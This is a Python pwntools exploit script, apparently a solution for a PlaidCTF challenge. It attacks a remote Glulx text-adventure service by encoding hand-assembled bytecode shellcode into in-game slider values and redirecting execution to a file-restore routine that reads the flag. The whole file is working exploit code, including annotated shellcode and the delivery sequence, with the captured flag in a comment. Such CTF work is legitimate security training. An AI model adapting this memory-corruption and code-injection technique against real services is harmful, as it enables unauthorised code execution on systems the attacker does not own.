#!/usr/bin/env python
# encoding: utf-8

from pwn import remote, process, ELF
from pwn import context
from pwn import p8,p16,p32,p64,u32,u64,asm

context(arch='amd64', os='linux', log_level='debug', endian='big')
r = None

def set_slider(num):
    r.sendline('set %d' % num)
    r.recvuntil('>')

def set_dial(flavor):
    r.sendline('set %s' % flavor)
    r.recvuntil('>')

def press():
    r.sendline('press')
    r.recvuntil('>')

def drink(soda):
    r.sendline('drink %s' % soda)
    r.recvuntil('>')

def look(obj):
    r.sendline('look %s' % obj)
    r.recvuntil('>')

def drop(obj):
    r.sendline('drop %s' % obj)
    r.recvuntil('>')

def write(s):
    assert(len(s) <= 34)
    r.sendline('write %s' % s)
    r.recvuntil('>')

def exploit(host):
    global r
    port = 6910
    r = remote(host, port)

    r.sendline('')
    r.recvuntil('>')

    sc_addr = 479074

    """
    routine763 fileref_create_by_prompt @glk 98
    routine589 stream_open_file @glk 66
    routine781 fileref_destroy @glk 99

    fref = fileref_create_by_prompt(1, 2, 0)
    stream_id = stream_open_file(fref, fmode=2, rock=301)
    fileref_destroy(fref)
    @restore stream_id

    @callfiii routine763 1 2 0 -> local4;
    @callfiii routine589 local4 2 301 -> mem131680
    @callfiii routine589 local4
    @restore mem131680

    [RestoreSub local0 local4 ;
    c104020000

    @callfiii routine763 1 2 0 -> local4;
    8163 130109 000002fb 01 02 04

    @callfiii routine589 local4 2 301 -> mem131680
    8163 93210d 0000024d 04 02 012d 60

    @callfi routine781 local4 -> 0
    8161 9300 0000030d 04

    @restore mem131680 -> local0
    8124 9d 60 00

    @return 0
    31 01 01
    """
    shellcode = 'c1040200008163130109000002fb010204816393210d0000024d0402012d60816193000000030d0481249d6000310101'.decode('hex')
    shellcode = shellcode.ljust(0x44, '\xff')

    flavors = ['apple', 'apricot', 'blackberry', 'cherry', 'cranberry', 'cola', 'grape', 'guava', 'lemon', 'lime', 'orange', 'pickle', 'peach', 'pear', 'pineapple', 'raspberry', 'strawberry', 'watermelon']
    set_dial('pickle')
    set_slider(u32(shellcode[0:4], sign=True))
    press()

    k = 4
    for f in flavors[:-1]:
        if f != 'pickle':
            drink('pickle')
            set_dial(f)
            set_slider(u32(shellcode[k:k+4], sign=True))
            press()
            k += 4

    drink('pickle')
    set_dial(flavors[-1])
    set_slider(sc_addr)
    press()

    r.sendline('drink pickle')
    r.recvuntil("glksave")
    r.send("\x08"*12)
    r.sendline("flag.glksave")
    r.sendline("look blackboard")
    # PCTF{pWn_4dv3ntUrE_IF_3d1ti0n}

if __name__ == '__main__':
    host = 'plaidadventure2.pwni.ng'
    exploit(host)
    r.interactive()
